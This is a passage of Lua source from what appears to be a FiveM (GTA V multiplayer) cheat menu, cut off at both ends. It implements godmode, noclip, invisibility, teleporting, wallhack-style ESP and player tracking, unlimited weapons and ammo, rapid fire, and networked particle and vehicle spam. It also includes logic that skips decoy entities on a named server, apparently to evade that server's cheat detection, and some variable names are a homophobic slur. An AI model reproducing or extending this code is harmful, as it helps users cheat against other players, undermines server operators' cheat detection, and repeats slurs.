
                    for k, v in pairs(Key) do
                        if Winnie_IsDisabledControlPressed(2, v) then

                            if keyboard then
                                keyboardui["BindingTouch"] = k
                                keyboardui["Value"] = v
                            end

                            if mouseui then
                                oooopppppppeeeeeeeen["BindingTouch"] = k
                                oooopppppppeeeeeeeen["Value"] = v
                            end



                        end
                    end



                    if Winnie_IsDisabledControlJustPressed(0, 18) then
                        if mouseui then
                  --  textureMouseUI()
                            kibind = false
                            local f = true
                        end

                        if keyboard then
                  --     textureKeyboard()
                            kibind = false
                            ZM_KeyboardUI.Open = true
                            local f = true
                        end

                        if externalmenu then
                            kibind = false
                            local f = true
                        end
                        font.Pop(id);
                    end
                end
            end)
    local function bind()
        local b = nil
        local c = nil
        local d = false
        while New.active do
            CIT.Wait(0)
            for e, f in pairs(Key) do
                if Winnie_IsDisabledControlPressed(0, f) then
                    b = f
                    c = e
                end
            end
            if b ~= nil then
                d = true
                return b, c
            end
        end
    end


    local notifications = {}

    local resx, resy = Winnie_GetActiveScreenResolution()

    local function rect(x,y,w,h,r,g,b,a)
        DrawRect(x/resx,y/resy,w/resx,h/resy, math.floor(r), math.floor(g), math.floor(b), math.floor(a))
    end

    local function DrawText(text,x,y,scale,font,centre,float)
        SetTextCentre(centre)
        SetTextScale(scale/resy, scale/resy)
        SetTextFont(font)
        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName(tostring(text or ''))
        EndTextCommandDisplayText(x/resx, y/resy)
    end
    function request(text, miliseconds)
        table.insert(notifications, {delete = miliseconds, y = resy/2 + 100, text = text, timer = GetGameTimer(), x = -100, done = false, startanim = false})
    end

    local functionFreecam = {}
    local function requestFreecam(text)
        table.insert(functionFreecam, {text = text, color = {255, 255, 255, 255}, count = 1, w = 0.0, h = 0.0, x = 0.02, opacity = 255, y = 0.51})
    end

    requestFreecam("Freecam Particle")
    requestFreecam("Freecam Launch Car")
    requestFreecam("Freecam Spam Car")
    requestFreecam("Freecam Spam Ped")
    requestFreecam("Freecam Create Props")
    requestFreecam("Freecam Shoot Bullet")
    requestFreecam("Freecam Teleport")

    CIT.CreateThread(function()

            while true do
                Wait(0)

                for k,v in pairs(notifications) do


                    local width = 200 - (GetGameTimer()-v.timer)/v.delete*200

                    rect(v.x, v.y - k * 50 + 22, 200, 30, 10, 10, 10, 255)

                    rect(v.x, v.y - k * 50 + 9, 200, 1, 0, 0, 0, 255)
                    rect(v.x - 100 + width/2, v.y - k * 50 + 7.8, width, 1, 111, 126, 217, 255)

                    DrawText(v.text,v.x-100+50, v.y - k * 50 + 11,312,4,false)


                    if v.x < 110 and not v.done then
                        v.x = v.x + 5
                    end

                    if v.x >= 110 then
                        v.done = true
                    end

                    if GetGameTimer() > v.timer + v.delete then
                        v.startanim = true
                    end

                    if v.startanim then
                        v.x = v.x - 2
                        if v.x < -100 then
                            table.remove(notifications,k)
                        end
                    end
                end

            end
        end)





        local function Externe()
            if booleanCheck.healslider == enable then
                SetEntityHealth(PlayerPedId(), 200)
            end

            if booleanCheck.armorslider == enable then
                SetPedArmour(PlayerPedId(), 100)
            end

            if booleanCheck.revive == enable then
                local coords = GetEntityCoords(PlayerPedId())
                NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId(), true, false))
                StopScreenEffect("DeathFailOut")
            end

            if booleanCheck.suicide == enable then
                SetEntityHealth(PlayerPedId(), 0)
            end

            if booleanCheck.outfit == enable then
                SetPedRandomComponentVariation(PlayerPedId(), false)
                SetPedRandomProps(PlayerPedId())
            end

            if booleanCheck.tpwaypoint == enable then
                CreateThread(
                    function()
                        local waypoint = GetFirstBlipInfoId(8)
                        if not DoesBlipExist(waypoint) then
                            return
                        end
                        while DoesBlipExist(waypoint) do
                            local coords = GetBlipInfoIdCoord(waypoint).xy

                            for height = 1, 1000 do
                                SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                                local found, height = GetGroundZFor_3dCoord(coords.x, coords.y, height + 0.0)

                                if found then
                                    SetPedCoordsKeepVehicle(
                                        PlayerPedId(),
                                        coords.x,
                                        coords.y,
                                        height + 0.0
                                    )
                                    break
                                end
                                Wait(0)
                            end
                        end
                    end
                )
            end

            if booleanCheck.cleartask == enable then
                ClearPedTasksImmediately(PlayerPedId())
            end

            if booleanCheck.wantedplayer == enable then
                print("Wanted player")
            end

            if booleanCheck.superman == enable then
                local ped = PlayerPedId()
                local coordsPlayer = GetEntityCoords(ped)
                SetEntityCoords(ped, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z + 200)
                TaskSkyDive(ped)
            end

            if booleanCheck.playermodel == enable then
                print("Player model")
            end

            if booleanCheck.noclip == enable then
                local PED = Winnie_PlayerPedId()
                local SPEED = math.abs(2.0)
                local COORDS = Winnie_GetEntityCoords(PED)
                local CAM = Winnie_GetGameplayCamRot(0)

                if IsPedFalling(Winnie_PlayerPedId()) then
                    Winnie_ClearPedTasksImmediately(Winnie_PlayerPedId())
                end

                local playerVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
                local vehicleornot = nil
                local clap, clip, clop = nil
                if not playerVehicle then
                    vehicleornot = PlayerPedId()
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 2))
                else
                    vehicleornot = GetVehiclePedIsIn(PlayerPedId(), 0)
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 1))
                end

                if playerVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
                    RequestControlOnce(vehicleornot)
                end

                if Winnie_IsDisabledControlPressed(0, 21) then
                    SPEED = SPEED * 5
                elseif Winnie_IsDisabledControlPressed(0, 36) then
                    SPEED = SPEED / 5
                end

                local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)

                if Winnie_IsDisabledControlPressed(0, 32) then
                    COORDS = COORDS + left * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 33) then
                    COORDS = COORDS + left * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 30) then
                    COORDS = COORDS + right * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 34) then
                    COORDS = COORDS + right * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 55) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z + SPEED)
                end
                if Winnie_IsDisabledControlPressed(0, 36) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z - SPEED)
                end
                Winnie_SetEntityCoordsNoOffset(vehicleornot, COORDS.x, COORDS.y, COORDS.z, true, true, true)
            end

            if booleanCheck.godmode == enable then
                SetEntityInvincible(PlayerPedId(), true)
            else
                SetEntityInvincible(PlayerPedId(), false)
            end

            if booleanCheck.invisible == enable then
                Winnie_SetEntityVisible(Winnie_PlayerPedId(), false)
            else
                Winnie_SetEntityVisible(Winnie_PlayerPedId(), true)
            end

            if booleanCheck.fastrun == enable then
                SetPedMoveRateOverride(PlayerPedId(), 2.40)
            else
                SetPedMoveRateOverride(PlayerPedId(), 1.0)
            end


            if booleanCheck.stamina == enable then
                ResetPlayerStamina(PlayerId())
            end

            if booleanCheck.nocollision == enable then
                SetPedCapsule(PlayerPedId(), 5)
                SetEntityCollision(PlayerPedId(), false, false)
            else
                SetPedCapsule(PlayerPedId(), 0)
                SetEntityCollision(PlayerPedId(), true, true)
            end

            if booleanCheck.fastswim == enable then
                local get = GetEntityHealth(PlayerPedId())
                if get <= 199 then
                    SetEntityHealth(PlayerPedId(), 200)
                end
            end



            if booleanCheck.fastswim == enable then
                SetSwimMultiplierForPlayer(PlayerId(), 1.49)
            else
                SetSwimMultiplierForPlayer(PlayerId(), 1.0)
            end



            if booleanCheck.rollinfinity == enable then
                StatSetInt(GetHashKey("MP0_STRENGTH"), 1100, true)
                StatSetInt(GetHashKey("MP0_WHEELIE_ABILITY"), 1100, true)
                StatSetInt(GetHashKey("MP0_DRIVING_ABILITY"), 1100, true)
                StatSetInt(GetHashKey("MP0_FLYING_ABILITY"), 1100, true)
                StatSetInt(GetHashKey("MP0_SHOOTING_ABILITY"), 1100, true)
                StatSetInt(GetHashKey("MP0_STEALTH_ABILITY"), 1100, true)
            end

            if booleanCheck.noradoll == enable then
                SetPedCanRagdoll(PlayerPedId(), false)
            end

            if booleanCheck.jump == enable then
                SetSuperJumpThisFrame(PlayerId())
            end

            if booleanCheck.freecam == enable then
                local playerCoords = Winnie_GetPedBoneCoords(Winnie_PlayerPedId(), 31086, 0.0, 0.0, 0.0)
                local cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0, 45.0, 0, 2)
                cam = cam
                local calcHeight = #functionFreecam * 0.028
                local b = 0.0
                local c = 0.0
                local d = 0.0



                Winnie_RenderScriptCams(true, true, 700, 1, 1)
                Winnie_SetCamActive(cam, true)
                Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), true)


            CreateThread(function()
                while Winnie_DoesCamExist(cam) do
                    Wait(0)

                    --- si menu ouvert on ferme la cam


                    if booleanCheck.freecam == disable then
                        DestroyCam(cam)
                        Winnie_ClearTimecycleModifier()
                        Winnie_RenderScriptCams(false, true, 700, 1, 0)
                        Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), false)
                        Winnie_SetFocusEntity(Winnie_PlayerPedId())
                    end


                    if math.floor(tonumber(booleanCheck.freecamfovslider)) > 0.0 then
                        Winnie_SetCamFov(cam, math.floor(tonumber(booleanCheck.freecamfovslider)))
                    else
                        Winnie_SetCamFov(cam, 10.0)
                    end


                    local f = Winnie_GetCamRot(cam)

                    if math.floor(tonumber(booleanCheck.freecamsensislider)) > 0.0 then
                        b = b - Winnie_GetDisabledControlNormal(1, 2) * math.floor(tonumber(booleanCheck.freecamsensislider)) + 0.0
                        d = d - Winnie_GetDisabledControlNormal(1, 1) * math.floor(tonumber(booleanCheck.freecamsensislider)) + 0.0
                    else
                        b = b - Winnie_GetDisabledControlNormal(1, 2) * 3.0
                        d = d - Winnie_GetDisabledControlNormal(1, 1) * 3.0
                    end

                    local hit, coordsCam = CalculeCamCoords(5000.0, cam)


                    if b > 90.0 then b = 90.0 elseif b < -90.0 then b = -90.0 end if c > 90.0 then c = 90.0 elseif c < -90.0 then c = -90.0 end if d > 360.0 then d = d - 360.0 elseif d < -360.0 then d = d + 360.0 end

                    if b and d and c and not ZM_M1000.Draw then
                        Winnie_SetCamRot(cam, b, c, d, 2)
                    end

                    local D, E, F = table.unpack(Winnie_GetCamCoord(cam))
                    if Winnie_IsDisabledControlPressed(1, 32) then
                        if Winnie_IsDisabledControlPressed(1, 21) then
                            if math.floor(tonumber(booleanCheck.freecamspeedslider)) > 0.0 then
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * math.floor(tonumber(booleanCheck.freecamspeedslider)) + 0.0)
                            else
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * 3.0)
                            end
                        else
                            if math.floor(tonumber(booleanCheck.freecamspeedslider)) > 0.0 then
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * math.floor(tonumber(booleanCheck.freecamspeedslider)) + 0.0)
                            else
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * 3.0)
                            end
                        end
                    elseif Winnie_IsDisabledControlPressed(1, 33) then
                        if math.floor(tonumber(booleanCheck.freecamspeedslider)) > 0.0 then
                            Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) -rot(f) * 0.5 * math.floor(tonumber(booleanCheck.freecamspeedslider)) + 0.0)
                        else
                            Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) -rot(f) * 0.5 * 3.0)
                        end
                    end
                    if Winnie_IsDisabledControlPressed(1, 21) then
                        F = F + 0.1 * 2.5
                    end
                    if Winnie_IsDisabledControlPressed(1, 36) then
                        F = F - 0.1 * 0.5
                    end

                end

            end)
        end





            ----- visual -----



            if booleanCheck.boxes or booleanCheck.healbar or booleanCheck.armorbar == enable then
                for k, v in pairs(GetGamePool("CPed")) do

                    if booleanCheck.includeself == enable then
                        ZM_M1000.faggot = v
                    else
                        ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                    end

                    if booleanCheck.includeplayers == enable then
                        ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                    else
                        ZM_M1000.fgt = v
                    end

                if ZM_M1000.fgt and ZM_M1000.faggot then
                    local antifakeplayer = GetEntityAlpha(v) <= 100
                        if scriptresourceexist("gtalife-z") then
                            if not antifakeplayer then
                                Winnie_SetDrawOrigin(Winnie_GetPedBoneCoords(v, 31086), 0)
                                BoxesExternal(v)
                            end
                        else
                            Winnie_SetDrawOrigin(Winnie_GetPedBoneCoords(v, 31086), 0)
                            BoxesExternal(v)
                        end
                    end
                end
                ClearDrawOrigin()
            end

            if booleanCheck.skeleton == enable then
                for k, v in pairs(GetGamePool("CPed")) do

                    local bone = Winnie_GetPedBoneCoords(v, 0x0, 0.0, 0.0, 0.0)
                    local size = shapeprout(bone)

                    local pedSelect = Winnie_GetPlayerPed(v)
                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                    if booleanCheck.includeself == enable then
                        ZM_M1000.faggot = v
                    else
                        ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                    end

                    if booleanCheck.includeplayers == enable then
                        ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                    else
                        ZM_M1000.fgt = v
                    end


                    local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bone.x, bone.y, bone.z, true)
                    if d <= 3000 then


                    if ZM_M1000.faggot and ZM_M1000.fgt  then
                        local antifakeplayer = GetEntityAlpha(v) <= 100
                        if scriptresourceexist("gtalife-z") then
                            if not antifakeplayer then
                                Winnie_DrawLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                Winnie_DrawLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            end
                        else
                            Winnie_DrawLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            Winnie_DrawLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            end
                        end
                    end
                end
            end

            if booleanCheck.blips == enable then
                for k, v in pairs(GetActivePlayers()) do
                    id = GetPlayerPed(v)
                    local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                    if not DoesBlipExist(playerblip, CIT.ReturnResultAnyway()) then
                        playerblip = AddBlipForEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                        SetBlipSprite(playerblip, 57)
                        ShowHeadingIndicatorOnBlip(playerblip, true)
                        SetBlipNameToPlayerName(playerblip, v)
                        SetBlipScale(playerblip, 0.80)
                        SetBlipColour(playerblip, 15)
                    end
                end
                else
                    if booleanCheck.blips == disable then
                        local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                        if DoesBlipExist(playerblip) then
                            RemoveBlip(playerblip)
                        end
                    end
                end




            if booleanCheck.nowater == enable then
                CIT.InvokeNative(0xC54A08C85AE4D410, 999999.0)
            else
                CIT.InvokeNative(0xC54A08C85AE4D410, 1.0)
            end

            if booleanCheck.noprops == enable then
                for k, v in pairs(GetGamePool("CObject")) do
                    Winnie_SetEntityVisible(v, false, false)
                end
            else
                for k, v in pairs(GetGamePool("CObject")) do
                    Winnie_SetEntityVisible(v, true, true)
                end
            end

            if booleanCheck.playername == enable then
                NameTagExternal()
            end

            if booleanCheck.clearnight == enable then
                SetWeatherTypePersist("CLEAR")
                SetWeatherTypeNowPersist("CLEAR")
                SetWeatherTypeNow("CLEAR")
                SetOverrideWeather("CLEAR")
            else
                SetWeatherTypePersist("EXTRASUNNY")
                SetWeatherTypeNowPersist("EXTRASUNNY")
                SetWeatherTypeNow("EXTRASUNNY")
                SetOverrideWeather("EXTRASUNNY")
            end




            if booleanCheck.thermalvision == enable then
                SetSeethrough(true)
            else
                SetSeethrough(false)
            end

            if booleanCheck.line == enable then
                for k, v in pairs(GetGamePool("CPed")) do
                    local selfCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                    local pedCoords = Winnie_GetEntityCoords(v)

                    if booleanCheck.includeself == enable then
                        ZM_M1000.faggot = v
                    else
                        ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                    end

                    if booleanCheck.includeplayers == enable then
                        ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                    else
                        ZM_M1000.fgt = v
                    end

                    local d = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), pedCoords.x, pedCoords.y, pedCoords.z,true) * (1.1 - 0.2)
                    if ZM_M1000.faggot and ZM_M1000.fgt and not Winnie_IsEntityDead(v) then
                        local antifakeplayer = GetEntityAlpha(v) <= 100
                            if not antifakeplayer then
                            if scriptresourceexist("gtalife-z") then
                             if d <= math.abs(1000 * rE_Slider["Slider_espdistance_value"]) then
                                    Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                 end
                            else
                                Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                            end
                        end
                    end
                end
            end

            if booleanCheck.nightvision == enable then
                SetNightvision(true)
            else
                SetNightvision(false)
            end

            if booleanCheck.removefog == enable then
                Winnie_SetTimecycleModifier("yell_tunnel_nodirect")
            end

            if booleanCheck.clearnight == enable then
                SetWeatherTypePersist("CLEAR")
                SetWeatherTypeNowPersist("CLEAR")
                SetWeatherTypeNow("CLEAR")
                SetOverrideWeather("CLEAR")
            else
                SetWeatherTypePersist("EXTRASUNNY")
                SetWeatherTypeNowPersist("EXTRASUNNY")
                SetWeatherTypeNow("EXTRASUNNY")
                SetOverrideWeather("EXTRASUNNY")
            end

            if booleanCheck.noprops == enable then
                for k, v in pairs(GetGamePool("CObject")) do
                    Winnie_SetEntityVisible(v, false, false)
                end
            else
                for k, v in pairs(GetGamePool("CObject")) do
                    Winnie_SetEntityVisible(v, true, true)
                end

            end

            if booleanCheck.crosshair == enable then
                HideHudComponentThisFrame(14)
                 Winnie_DrawRect(0.50, 0.50, 0.005, 0.002, 255, 255, 255, 255)
                Winnie_DrawRect(0.50, 0.50, 0.001, 0.008, 255, 255, 255, 255)
                ClearDrawOrigin()
            end

            if booleanCheck.giveall == enable then
                for k, v in pairs(weapons) do
                    GiveWeaponToPed(Winnie_PlayerPedId(), GetHashKey(v), 1000, false, true)
                end
            end

            if booleanCheck.removeall == enable then
                for k, v in pairs(weapons) do
                    RemoveWeaponFromPed(Winnie_PlayerPedId(), GetHashKey(v))
                end
            end

            if booleanCheck.givespecific == enable then
                local spe = KeyboardInput("Specific", "WEAPON_", 100)
                GiveWeaponToPed(Winnie_PlayerPedId(), GetHashKey(spe), 1000, false, true)
            end

            if booleanCheck.removespecific == enable then
                local result = KeyboardInput("Which Weapon?", "", 50)
                    Winnie_RemoveWeaponFromPed(Winnie_PlayerPedId(), Winnie_GetHashKey(string.upper(result)))


            end


            if booleanCheck.maxammo == enable then
                for k, v in pairs(weapons) do
                    SetPedAmmo(Winnie_PlayerPedId(), GetHashKey(v), 1000)
                end
            end

            if booleanCheck.removeammo == enable then
                for k, v in pairs(weapons) do
                    SetPedAmmo(Winnie_PlayerPedId(), GetHashKey(v), 0)
                end
            end

            if booleanCheck.nospread == enable then
                SetPedAccuracy(PlayerPedId(), 100)
            end

            if booleanCheck.ammoilimited == enable then
                for k, v in pairs(weapons) do
                    SetPedAmmo(Winnie_PlayerPedId(), GetHashKey(v), 1000)
                end
            end

            if booleanCheck.rapidfire == enable then
                if Winnie_IsDisabledControlPressed(0, 257) and IsPlayerFreeAiming(PlayerId()) then
                    local _, weapon = Winnie_GetCurrentPedWeapon(PlayerPedId())
                    local wepent = Winnie_GetCurrentPedWeaponEntityIndex(PlayerPedId())
                    local launchPos = Winnie_GetEntityCoords(wepent)
                    local targetPos = Winnie_GetGameplayCamCoord() + (rot(Winnie_GetGameplayCamRot(2)) * 200.0)

                   ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
                   ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
                end
            end

            if booleanCheck.shootteleport == enable then
                local GET, TEG = Winnie_GetPedLastWeaponImpactCoord(Winnie_PlayerPedId())
                if GET then
                    Winnie_SetEntityCoords(Winnie_PlayerPedId(), TEG)
                end
            end

            if booleanCheck.ptfxbullet == enable then
                local gox_dict = "core"
                    local x, coords = Winnie_GetPedLastWeaponImpactCoord(Winnie_PlayerPedId())

                        if x then
                        Winnie_RequestNamedPtfxAsset(gox_dict)
                        while not  Winnie_HasNamedPtfxAssetLoaded(gox_dict) do
                            Wait(10)
                        end
                        Winnie_UseParticleFxAsset(gox_dict)
                        if math.floor(tonumber(booleanCheck.ptrfxxcaleslider)) > 0.0 then
                            Winnie_StartNetworkedParticleFxNonLoopedAtCoord("bul_glass", coords.x,coords.y,coords.z, 0, 0, 0, math.floor(tonumber(booleanCheck.ptrfxxcaleslider)), 0, 0, 0)
                        else
                            Winnie_StartNetworkedParticleFxNonLoopedAtCoord("bul_glass", coords.x,coords.y,coords.z, 0, 0, 0, 10.0, 0, 0, 0)
                        end
                    end
                end

            if booleanCheck.shootvehicle == enable then
                local vehicleGun = "mule"
                local playerPedPos = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                if Winnie_IsPedShooting(Winnie_PlayerPedId()) then
                    while not Winnie_HasModelLoaded(Winnie_GetHashKey(vehicleGun)) do
